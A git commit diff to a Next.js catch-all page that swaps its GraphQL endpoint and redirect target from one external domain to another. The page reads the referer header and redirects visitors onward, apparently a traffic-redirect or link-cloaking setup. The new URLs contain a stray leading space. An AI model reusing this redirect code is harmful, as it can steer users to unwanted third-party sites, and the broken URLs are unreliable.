f9dc2e1c5dff4d29cf54a5ee676e8e47b4087bc9
techyeyestore <129699711+techyeyestore@users.noreply.github.com>
2023-04-17 08:58:08 +0530

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://movieswood.buzz/graphql"
+	const endpoint = " https://hostguru.ml/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://movieswood.buzz/` + encodeURI(path as string)
+					` https://hostguru.ml/` + encodeURI(path as string)
 				}`,
 			},
 		};
